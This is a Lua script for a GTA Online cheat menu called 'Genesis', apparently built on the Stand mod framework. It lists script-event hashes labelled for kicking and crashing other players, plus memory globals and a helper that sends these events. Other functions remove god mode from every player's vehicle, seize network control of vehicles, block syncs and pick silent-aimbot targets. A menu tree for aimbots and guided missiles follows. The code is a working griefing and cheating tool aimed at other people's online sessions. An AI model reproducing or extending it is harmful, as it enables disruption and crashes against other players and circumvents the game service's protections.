util.keep_running()
util.require_natives("natives-1672190175")
util.require_natives("natives-1640181023")
util.require_natives("1640181023")
util.require_natives("natives-1663599433")
util.require_natives("natives-1651208000")
util.require_natives(1663599433)

-- Add all SE's here for quicker updates
local se = {
    tpspread = -1388926377, -- older gta se version
    orbitalfuck = 677240627, -- older gta se version
    jobnotify = 2386092767, -- older gta se version
    givecollectible = 697566862, -- older gta se version
    kick1_casino = 1268038438, -- older gta se version
    kick2 = 915462795, -- older gta se version
    arraykick = 1613825825,
    sekicks0 = -1013606569,
    sekicks1 = -901348601,
    sekicks3 = -1638522928,
    sekicks3_1 = 1017995959, -- older gta se version
    sekicks4 = -2026172248,
    sekicks7 = -642704387,
    secrash = -992162568, -- older gta se version
    startfaketyping = 747270864, -- older gta se version
    stopfaketyping = -990958325, -- older gta se version
}

-- Add all Globals here for quicker updates
local glob = {
    base = 262145,
    player = 2689235, -- older gta global version
    check = 78689,
    slot = 2359296,
    pveh = 1586488,
    resupplyacid = 1648637, -- older gta global version
    orbi = 1969112,
    nohud = 1645739, -- older gta global version
    fastrespawn = 2672524,
    playerpoint = 4521801,
    sekickarg1 = 2657704,
    sekickarg2 = 1892703, -- older gta global version
    player_bounty = 1835502, -- older gta global version
    bounty1 = 2815059 -- older gta global version    
}


--[[ ||| DEFINE FUNCTIONS ||| ]]--

local function tunable(value)
    return memory.script_global(glob.base + value)
end

local globals = {
    nightclub_prices = {
        ["La Mesa"] = tunable(24838), -- older gta global version
        ["Mission Row"] = tunable(24843), -- older gta global version
        ["Vespucci Canals"] = tunable(24845) -- older gta global version
    }
}

function send_script_event(first_arg, receiver, args)
    table.insert(args, 1, first_arg)
    util.trigger_script_event(1 << receiver, args)
end

local function vector3(x, y, z)
    return { x = x, y = y, z = z }
end

function pid_to_handle(pid)-- Credits to lance
    handle_ptr = memory.alloc(13*8)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, handle_ptr, 13)
    return handle_ptr
end

function Get_Waypoint_Pos2()
    if HUD.IS_WAYPOINT_ACTIVE() then
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
        local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
        return waypoint_pos
    else
        util.toast("-Genesis-\n\nNo Waypoint Set!")
    end
end

STP_COORD_HEIGHT = 300
STP_SPEED_MODIFIER = 0.02
function SmoothTeleportToCord(v3coords, teleportFrame)
    local wppos = v3coords
    local localped = PLAYER.GET_PLAYER_PED(players.user())
    if wppos ~= nil then 
        if not CAM.DOES_CAM_EXIST(CCAM) then
            CAM.DESTROY_ALL_CAMS(true)
            CCAM = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
            CAM.SET_CAM_ACTIVE(CCAM, true)
            CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
        end
        if teleportFrame then
            util.create_tick_handler(function ()
                if CAM.DOES_CAM_EXIST(CCAM) then
                    local tickCamCoord = CAM.GET_CAM_COORD(CCAM)
                    if not PED.IS_PED_IN_ANY_VEHICLE(localped, true) then 
                        ENTITY.SET_ENTITY_COORDS(localped, tickCamCoord.x, tickCamCoord.y, tickCamCoord.z, false, false, false, false) 
                    else
                        local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
                        ENTITY.SET_ENTITY_COORDS(veh, tickCamCoord.x, tickCamCoord.y, tickCamCoord.z, false, false, false, false) 
                    end
                else
                    return false
                end
            end)
        end
        local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()))
        for i = 0, 1, STP_SPEED_MODIFIER do 
            CAM.SET_CAM_COORD(CCAM, pc.x, pc.y, pc.z + EaseOutCubic(i) * STP_COORD_HEIGHT)
            local White = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}
            directx.draw_text(0.5, 0.5, tostring(EaseOutCubic(i) * STP_COORD_HEIGHT), 1, 0.6, White, false)
            local look = util.v3_look_at(CAM.GET_CAM_COORD(CCAM), pc)
            CAM.SET_CAM_ROT(CCAM, look.x, look.y, look.z, 2)
            util.yield()
        end
        local currentZ = CAM.GET_CAM_COORD(CCAM).z
        local coordDiffx = wppos.x - pc.x
        local coordDiffxy = wppos.y - pc.y
        for i = 0, 1, STP_SPEED_MODIFIER / 2 do
            CAM.SET_CAM_COORD(CCAM, pc.x + (EaseInOutCubic(i) * coordDiffx), pc.y + (EaseInOutCubic(i) * coordDiffxy), currentZ)
            util.yield()
        end
        local success, ground_z
        repeat
            STREAMING.REQUEST_COLLISION_AT_COORD(wppos.x, wppos.y, wppos.z)
            success, ground_z = util.get_ground_z(wppos.x, wppos.y)
            util.yield()
        until success
        if not PED.IS_PED_IN_ANY_VEHICLE(localped, true) then 
            ENTITY.SET_ENTITY_COORDS(localped, wppos.x, wppos.y, ground_z, false, false, false, false) 
        else
            local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
            local v3Out = memory.alloc()
            local headOut = memory.alloc()
            PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(wppos.x, wppos.y, ground_z, v3Out, headOut, 1, 3.0, 0)
            local head = memory.read_float(headOut)
            memory.free(headOut)
            memory.free(v3Out)
            ENTITY.SET_ENTITY_COORDS(veh, wppos.x, wppos.y, ground_z, false, false, false, false)
            ENTITY.SET_ENTITY_HEADING(veh, head)
        end
        util.yield()
        local pc2 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()))
        local coordDiffz = CAM.GET_CAM_COORD(CCAM).z - ground_z -2
        local camcoordz = CAM.GET_CAM_COORD(CCAM).z       
        for i = 0, 1, STP_SPEED_MODIFIER / 2 do
            local pc23 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()))
            CAM.SET_CAM_COORD(CCAM, pc23.x, pc23.y, camcoordz - (EaseOutCubic(i) * coordDiffz))
            util.yield()
        end
        util.yield()
        CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
        if CAM.IS_CAM_ACTIVE(CCAM) then
            CAM.SET_CAM_ACTIVE(CCAM, false)
        end
        CAM.DESTROY_CAM(CCAM, true)
    else
        util.toast("-Genesis-\n\nNo Waypoint Set!")
    end
end

function TurnCarOnInstantly()
    local localped = players.user_ped()
    if PED.IS_PED_GETTING_INTO_A_VEHICLE(localped) then
        local veh = PED.GET_VEHICLE_PED_IS_ENTERING(localped)
        if not VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(veh) then
            VEHICLE.SET_VEHICLE_FIXED(veh)
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(veh, 1000)
            VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, false)
        end
        if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 then
            VEHICLE.SET_HELI_BLADES_FULL_SPEED(veh)
        end
    end
end

function EaseOutCubic(x)
    return 1 - ((1-x) ^ 3)
end

function EaseInCubic(x)
    return x * x * x
end

function EaseInOutCubic(x)
    if(x < 0.5) then
        return 4 * x * x * x;
    else
        return 1 - ((-2 * x + 2) ^ 3) / 2
    end
end

function UnlockVehicleGetIn()
    ::start::
    local localPed = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(localPed)
    if PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
        local v = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED(v, 1)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(v, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(v, players.user(), false)
        util.yield()
    else
        if veh ~= 0 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false) == 0 or veh ~= 0 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false) == players.user_ped() then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                for i = 1, 20 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    util.yield(100)
                end
            end
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
                util.toast("-Genesis-\n\nCould not get Control of Entity.")
                goto start
            else
                if SE_Notifications then
                    util.toast("-Genesis-\n\nGot Control of Entity.")
                end
            end
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(veh, 1)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(veh, false)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_PLAYER(veh, players.user(), false)
            VEHICLE.SET_VEHICLE_HAS_BEEN_OWNED_BY_PLAYER(veh, false)
            util.yield(2500)
            if not PED.IS_PED_IN_VEHICLE(players.user(), veh) then
                PED.SET_PED_INTO_VEHICLE(players.user_ped(), veh, -1)
            end
        end
    end
end

function RemoveVehicleGodmodeForAll()
    for i = 0, 31 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            local ped = PLAYER.GET_PLAYER_PED(i)
            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
                ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
                ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
            end
        end
    end
end

player_cur_car = 0
function OpenVehicleDoor_CurCar(open, doorIndex, loose, instant, force)
    if open then    
        VEHICLE.SET_VEHICLE_DOOR_OPEN(player_cur_car, doorIndex, loose, instant)
        if force then
            while force do
                VEHICLE.SET_VEHICLE_DOOR_OPEN(player_cur_car, doorIndex, LooseDoorBool, InstantDoorBool)
                util.yield()    
            end
        end
    elseif open == false then
        VEHICLE.SET_VEHICLE_DOOR_SHUT(player_cur_car, doorIndex, InstantDoorBool)
    end
end

function LowerVehicleWindow_CurCar(lower, windowIndex)
    if lower then 
        VEHICLE.ROLL_DOWN_WINDOW(player_cur_car, windowIndex)
    else
        VEHICLE.ROLL_UP_WINDOW(player_cur_car, windowIndex)
    end
end

local function bitTest(addr, offset)
    return (memory.read_int(addr) & (1 << offset)) ~= 0
end

local function clearBit(addr, bitIndex)
    memory.write_int(addr, memory.read_int(addr) & ~(1<<bitIndex))
end

function request_ptfx_asset(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

local function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, 
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            players.user_ped(), 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end

local function raycast_vehicle_heading(flag, distance, vehicle)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local veh_rot = ENTITY.GET_ENTITY_ROTATION(vehicle, 2)
    local veh_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, 0, 0, 0)
    local direction = v3.toDir(veh_rot)
    local destination = 
    { 
        x = veh_pos.x + direction.x * distance, 
        y = veh_pos.y + direction.y * distance, 
        z = veh_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            veh_pos.x, 
            veh_pos.y, 
            veh_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            players.user_ped(), 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end

function GetClosestPlayerWithRange(range)
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local tbl = {}
    local closest_player = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            tbl[#tbl+1] = entities.pointer_to_handle(pedPointers[i])
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= players.user_ped() then
                if PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = ENTITY.GET_ENTITY_COORDS(tbl[i])
                    local e = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_player = tbl[i]
                    end
                end
            end
        end
    end
    if closest_player ~= 0 then
        return closest_player
    else
        return nil
    end
end

AIM_WHITELIST = {}
function GetClosestPlayerWithRange_Whitelist(range, inair)
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local tbl = {}
    local closest_player = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            local handle = entities.pointer_to_handle(pedPointers[i])
            if (inair and (ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(handle) >= 9)) or (not inair) then --air check
                local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
                if not AIM_WHITELIST[playerID] then
                    tbl[#tbl+1] = handle
                end
            end
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= players.user_ped() then
                if PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = ENTITY.GET_ENTITY_COORDS(tbl[i])
                    local e = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_player = tbl[i]
                    end
                end
            end
        end
    end
    if closest_player ~= 0 then
        return closest_player
    else
        return nil
    end
end

local function GetSilentAimTarget()
    local dist = 1000000000
    local target = 0
    for k,v in pairs(entities.get_all_peds_as_handles()) do
        local returnTarget = true
        local localPos = players.get_position(players.user())
        local iPedPos = ENTITY.GET_ENTITY_COORDS(v, true)
        local distanceLocalTarget = MISC.GET_DISTANCE_BETWEEN_COORDS(localPos['x'], localPos['y'], localPos['z'], iPedPos['x'], iPedPos['y'], iPedPos['z'], true)
        if players.user_ped() ~= v and not ENTITY.IS_ENTITY_DEAD(v) and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(players.user_ped(), v, 17) then
            if not PED.IS_PED_FACING_PED(players.user_ped(), v, sAimFov) then
                returnTarget = false
            end
            if silentAimMode == "closest" then
                if distanceLocalTarget <= dist and PED.IS_PED_A_PLAYER(v) then
                    if returnTarget then
                        dist = distanceLocalTarget
                        target = v
                    end
                end
            end 
        end
    end
    return target
end

function GetClosestVehicleNodeWithHeading(x, y, z, nodeType)
    local outpos = v3.new()
    local outHeading = memory.alloc()
    PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(x, y, z, outpos, outHeading, nodeType, 3.0, 0)
    local pos = GetTableFromV3Instance(outpos); local heading = memory.read_float(outHeading)
    memory.free(outHeading); v3.free(outpos); return pos, heading
end

function GetTableFromV3Instance(v3int)
    local tbl = {x = v3.getX(v3int), y = v3.getY(v3int), z = v3.getZ(v3int)}
    return tbl
end

function BlockSyncs(pid, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end

spawned_objects = {}
get_vtable_entry_pointer = function(address, index)
    return memory.read_long(memory.read_long(address) + (8 * index))
end
get_sub_handling_types = function(vehicle, type)
    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x918)
    local sub_handling_array = memory.read_long(veh_handling_address + 0x0158)
    local sub_handling_count = memory.read_ushort(veh_handling_address + 0x0160)
    local types = {registerd = sub_handling_count, found = 0}
    for i = 0, sub_handling_count - 1, 1 do
        local sub_handling_data = memory.read_long(sub_handling_array + 8 * i)
        if sub_handling_data ~= 0 then
            local GetSubHandlingType_address = get_vtable_entry_pointer(sub_handling_data, 2)
            local result = util.call_foreign_function(GetSubHandlingType_address, sub_handling_data)
            if type and type == result then return sub_handling_data end
            types[#types+1] = {type = result, address = sub_handling_data}
            types.found = types.found + 1
        end
    end
    if type then return nil else return types end
end
local thrust_offset = 0x8
local heliHandlingOffsets = {0x18,0x20, 0x24, 0x30, 0x48, 0x4C, 0x58, 0x3C}

--Defining What is a Projectile
local function is_entity_a_projectile_all(hash)     -- All Projectile Offests
    local all_projectile_hashes = {
        util.joaat("w_ex_vehiclemissile_1"),
        util.joaat("w_ex_vehiclemissile_2"),
        util.joaat("w_ex_vehiclemissile_3"),
        util.joaat("w_ex_vehiclemissile_4"),
        util.joaat("w_ex_vehiclemortar"),
        util.joaat("w_ex_apmine"),
        util.joaat("w_ex_arena_landmine_01b"),
        util.joaat("w_ex_birdshat"),
        util.joaat("w_ex_grenadefrag"),
        util.joaat("xm_prop_x17_mine_01a"),
        util.joaat("xm_prop_x17_mine_02a"),
        util.joaat("w_ex_grenadesmoke"),
        util.joaat("w_ex_molotov"),
        util.joaat("w_ex_pe"),
        util.joaat("w_ex_pipebomb"),
        util.joaat("w_ex_snowball"),
        util.joaat("w_lr_rpg_rocket"),
        util.joaat("w_lr_homing_rocket"),
        util.joaat("w_lr_firework_rocket"),
        util.joaat("xm_prop_x17_silo_rocket_01"),
        util.joaat("w_ex_vehiclegrenade"),
        util.joaat("w_ex_vehiclemine"),
        util.joaat("w_lr_40mm"),
        util.joaat("w_smug_bomb_01"),
        util.joaat("w_smug_bomb_02"),
        util.joaat("w_smug_bomb_03"),
        util.joaat("w_smug_bomb_04"),
        util.joaat("w_am_flare"),
        util.joaat("w_arena_airmissile_01a"),
        util.joaat("w_pi_flaregun_shell"),
        util.joaat("w_smug_airmissile_01b"),
        util.joaat("w_smug_airmissile_02"),
        util.joaat("w_sr_heavysnipermk2_mag_ap2"),
        util.joaat("w_battle_airmissile_01"),
        util.joaat("gr_prop_gr_pmine_01a")
    }
    return table.contains(all_projectile_hashes, hash)
end

local function is_entity_a_missle(hash)     -- Missle Projectile Offsets
    local missle_hashes = {
        util.joaat("w_ex_vehiclemissile_1"),
        util.joaat("w_ex_vehiclemissile_2"),
        util.joaat("w_ex_vehiclemissile_3"),
        util.joaat("w_ex_vehiclemissile_4"),
        util.joaat("w_lr_rpg_rocket"),
        util.joaat("w_lr_homing_rocket"),
        util.joaat("w_lr_firework_rocket"),
        util.joaat("xm_prop_x17_silo_rocket_01"),
        util.joaat("w_arena_airmissile_01a"),
        util.joaat("w_smug_airmissile_01b"),
        util.joaat("w_smug_airmissile_02"),
        util.joaat("w_battle_airmissile_01"),
        util.joaat("h4_prop_h4_airmissile_01a")
    }
    return table.contains(missle_hashes, hash)
end

local function is_entity_a_grenade(hash)    -- Grenade Projectile Offsets
    local grenade_hashes = {
        util.joaat("w_ex_vehiclemortar"),
        util.joaat("w_ex_grenadefrag"),
        util.joaat("w_ex_grenadesmoke"),
        util.joaat("w_ex_molotov"),
        util.joaat("w_ex_pipebomb"),
        util.joaat("w_ex_snowball"),
        util.joaat("w_ex_vehiclegrenade"),
        util.joaat("w_lr_40mm")
    }
    return table.contains(grenade_hashes, hash)
end

local function is_entity_a_mine(hash)       -- Mine Projectile Offsets
    local mine_hashes = {
        util.joaat("w_ex_apmine"),
        util.joaat("w_ex_arena_landmine_01b"),
        util.joaat("w_ex_pe"),
        util.joaat("w_ex_vehiclemine"),
        util.joaat("xm_prop_x17_mine_01a"),
        util.joaat("xm_prop_x17_mine_02a"),
        util.joaat("gr_prop_gr_pmine_01a")
    }
    return table.contains(mine_hashes, hash)
end

local function is_entity_a_miscprojectile(hash)     -- Misc Projectile Offsets
    local miscproj_hashes = {
        util.joaat("w_ex_birdshat"),
        util.joaat("w_ex_snowball"),
        util.joaat("w_pi_flaregun_shell"),
        util.joaat("w_am_flare"),
        util.joaat("w_lr_ml_40mm"),
        util.joaat("w_sr_heavysnipermk2_mag_ap2")
    }
    return table.contains(miscproj_hashes, hash)
end

local function is_entity_a_bomb(hash)
   local bomb_hashes = {
        util.joaat("w_smug_bomb_01"),
        util.joaat("w_smug_bomb_02"),
        util.joaat("w_smug_bomb_03"),
        util.joaat("w_smug_bomb_04")
   } 
   return table.contains(bomb_hashes, hash)
end

function on_user_change_vehicle(vehicle)
    if vehicle ~= 0 then
        if initial_d_mode then 
            set_vehicle_into_drift_mode(vehicle)
        end
    end
end

function player_toggle_loop(root, pid, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(pid) then util.stop_thread() end
        callback()
    end)
end

function getPlayerRegType(pid)
    local boss = players.get_boss(pid)
    if boss ~= -1 then
        return memory.read_int(memory.script_global(1892703+1+boss*599+(10+428)))
    end
    return -1
end

local function ls_log(content)
    if ls_debug then
        util.toast(content)
        util.log(translations.script_name_for_log .. content)
    end
end

function show_custom_rockstar_alert(l1)
    poptime = os.time()
    while true do
        if PAD.IS_CONTROL_JUST_RELEASED(18, 18) then
            if os.time() - poptime > 0.1 then
                break
            end
        end
        native_invoker.begin_call()
        native_invoker.push_arg_string("ALERT")
        native_invoker.push_arg_string("JL_INVITE_ND")
        native_invoker.push_arg_int(2)
        native_invoker.push_arg_string("")
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(-1)
        native_invoker.push_arg_int(-1)
        -- line here
        native_invoker.push_arg_string(l1)
        -- optional second line here
        native_invoker.push_arg_int(0)
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(0)
        native_invoker.end_call("701919482C74B5AB")
        util.yield()
    end
end

object_uses = 0
local function mod_uses(type, incr)
    if incr < 0 and is_loading then
        ls_log("Not incrementing use var of type " .. type .. " by " .. incr .. "- script is loading")
        return
    end
    ls_log("Incrementing use var of type " .. type .. " by " .. incr)
    if type == "vehicle" then
        if vehicle_uses <= 0 and incr < 0 then
            return
        end
        vehicle_uses = vehicle_uses + incr
    elseif type == "pickup" then
        if pickup_uses <= 0 and incr < 0 then
            return
        end
        pickup_uses = pickup_uses + incr
    elseif type == "ped" then
        if ped_uses <= 0 and incr < 0 then
            return
        end
        ped_uses = ped_uses + incr
    elseif type == "player" then
        if player_uses <= 0 and incr < 0 then
            return
        end
        player_uses = player_uses + incr
    elseif type == "object" then
        if object_uses <= 0 and incr < 0 then
            return
        end
        object_uses = object_uses + incr
    end
end




--[[ ||| MAIN  ROOTS ||| ]]--

--[[Self Menu]]--
MenuSelf = menu.list(menu.my_root(), "Self", {""}, "Self Options.") ; menu.divider(MenuSelf, "Self Options")
    --[[Self Menu Subcategories]]--
    MenuMovement = menu.list(MenuSelf, "Movement", {""}, "Movement Options.") ; menu.divider(MenuMovement, "Movement Options")
        MenuMainMovement = menu.list(MenuMovement, "Movement", {""}, "Main Movement Options.") ; menu.divider(MenuMainMovement, "Main Movement Options")
        MenuTeleport = menu.list(MenuMovement, "Teleport", {""}, "Teleportation Options.") ; menu.divider(MenuTeleport, "Teleport Options")
    MenuHealth = menu.list(MenuSelf, "Health", {""}, "Health Options.") ; menu.divider(MenuHealth, "Health Options")
    MenuWeapon = menu.list(MenuSelf, "Weapon", {""}, "Weapon Options.") ; menu.divider(MenuWeapon, "Weapon Options")
        MenuWeaponHotswap = menu.list(MenuWeapon, "Hotswap", {""}, "Weapon Hotswap Options.") ; menu.divider(MenuWeaponHotswap, "Hotswap Options")
        MenuWeaponSAim = menu.list(MenuWeapon, "Silent Aimbot", {""}, "Silent Aimbot Options.") ; menu.divider(MenuWeaponSAim, "Silent Aimbot Options")
        MenuWeaponQR = menu.list(MenuWeapon, "Quick Rocket", {""}, "Quick Rocket Options.") ; menu.divider(MenuWeaponQR, "Quick Rocket Options")
        MenuWeaponGuidedM = menu.list(MenuWeapon, "Missle Guidance", {""}, "Missle Guidance Options.") ; menu.divider(MenuWeaponGuidedM, "Missle Guidance Options")
            MenuWeaponMA = menu.list(MenuWeaponGuidedM, "Missle Aimbot", {""}, "Missle Aimbot Options.") ; menu.divider(MenuWeaponMA, "Missle Aimbot Options")
            MenuWeaponMCLOS = menu.list(MenuWeaponGuidedM, "MCLOS", {""}, "MCLOS Guided Missle Options.") ; menu.divider(MenuWeaponMCLOS, "MCLOS Options")
            MenuWeaponSACLOS = menu.list(MenuWeaponGuidedM, "SACLOS", {""}, "SACLOS Guided Missle Options.") ; menu.divider(MenuWeaponSACLOS, "SACLOS Options")

--[[Vehicle Menu]]--
MenuVehicle = menu.list(menu.my_root(), "Vehicle", {""}, "Vehicle Options.") ; menu.divider(MenuVehicle, "Vehicle Options")
    --[[Vehicle Menu Subcategories]]--
    MenuVehicleMain = menu.list(MenuVehicle, "Main", {""}, "Main Vehicle Options.") ; menu.divider(MenuVehicleMain, "Main Vehicle Options")
        MenuVehMovement = menu.list(MenuVehicleMain, "Movement", {""}, "Vehicle Movement Options.") ; menu.divider(MenuVehMovement, "Vehicle Movement Options")
        MenuVehVisual = menu.list(MenuVehicleMain, "Visual", {""}, "Vehicle Visual Options.") ; menu.divider(MenuVehVisual, "Vehicle Visual Options")
            MenuVehVisualMain = menu.list(MenuVehVisual, "Visual", {""}, "Main Vehicle Visual Options.") ; menu.divider(MenuVehVisualMain, "Main Vehicle Visual Options")
            MenuVisualLights = menu.list(MenuVehVisual, "Vehicle Lights", {""}, "Vehicle Light Options.") ; menu.divider(MenuVisualLights, "Vehicle Light Options")
        MenuVehHealth = menu.list(MenuVehicleMain, "Health/Armour", {""}, "Vehicle Health/Armour Options.") ; menu.divider(MenuVehHealth, "Vehicle Health/Armour Options")
        MenuAircraft = menu.list(MenuVehicleMain, "Aircraft", {""}, "Aircraft Options.") ; menu.divider(MenuAircraft, "Aircraft Options")
            MenuJet = menu.list(MenuAircraft, "Jet", {""}, "Jet Options.") ; menu.divider(MenuJet, "Jet Options")
            MenuHeli = menu.list(MenuAircraft, "Helicopter", {""}, "Helicopter Options.") ; menu.divider(MenuHeli, "Helicopter Options")
            MenuAircraftUniversal = menu.list(MenuAircraft, "Universal", {""}, "Universal Aircraft Options.") ; menu.divider(MenuAircraftUniversal, "Universal Aircraft Options")
        MenuVehPersonal = menu.list(MenuVehicleMain, "Personal", {""}, "Personal Vehicle Options.") ; menu.divider(MenuVehPersonal, "Personal Vehicle Options")
    MenuVehicleOther = menu.list(MenuVehicle, "Other", {""}, "Other Vehicle Options.") ; menu.divider(MenuVehicleOther, "Other Vehicle Options")
        MenuVehDoors = menu.list(MenuVehicleOther, "Vehicle Doors", {""}, "Vehicle Door Options.") ; menu.divider(MenuVehDoors, "Vehicle Door Options")
            MenuVehOpenDoors = menu.list(MenuVehDoors, "Open/Close Doors", {""}, "Vehicle Open/Close Door Options.") ; menu.divider(MenuVehOpenDoors, "Vehicle Open/Close Door Options")
        MenuVehWindows = menu.list(MenuVehicleOther, "Vehicle Windows", {""}, "Vehicle Window Options.") ; menu.divider(MenuVehWindows, "Vehicle Window Options")
        MenuVehOtherCounterM = menu.list(MenuVehicleOther, "Countermeasures", {""}, "Vehicle Countermeasure Options.") ; menu.divider(MenuVehOtherCounterM, "Vehicle Countermeasure Options")
            MenuVehCounterFlare = menu.list(MenuVehOtherCounterM, "Flare", {""}, "Vehicle Flare Countermeasure Options.") ; menu.divider(MenuVehCounterFlare, "Vehicle Flare Countermeasure Options")
            MenuVehCounterChaff = menu.list(MenuVehOtherCounterM, "Chaff", {""}, "Vehicle Chaff Countermeasure Options.") ; menu.divider(MenuVehCounterChaff, "Vehicle Chaff Countermeasure Options")
            MenuCMAPS = menu.list(MenuVehOtherCounterM, "TROPHY APS", {""}, "TROPHY APS System Options.") ; menu.divider(MenuCMAPS, "Vehicle TROPHY APS Options")
        MenuVehOther = menu.list(MenuVehicleOther, "Miscellaneous", {""}, "Miscellaneous Vehicle Options.") ; menu.divider(MenuVehOther, "Miscellaneous Vehicle Options")

